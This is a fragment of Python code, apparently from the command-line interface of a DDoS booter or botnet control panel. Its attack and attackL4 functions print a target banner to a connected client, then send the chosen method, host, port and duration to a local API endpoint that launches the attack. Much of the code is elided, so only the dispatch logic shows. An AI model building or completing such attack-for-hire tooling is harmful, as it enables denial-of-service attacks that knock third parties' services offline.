...
def command_line(client, username):
    ...
    def attack(method, host, time, port):
        ...
        if concs == 3:
           ...
           send(client, f'           ╚══════════════════════════════════════════════════╝')
           requests.get(f"http://127.0.0.1:5000/attack?method={method}&host={host}&port={port}&time={time}&username={username}")
    def attackL4(method, host, time, port):
        ...
        if concs == 3:
           ...
           send(client, f'           ║  PORT >> {port}                                  ')
           send(client, f'           ╚══════════════════════════════════════════════════╝')
           requests.get(f"http://127.0.0.1:5000/attackL4?method={method}&host={host}&port={port}&time={time}&username={username}")
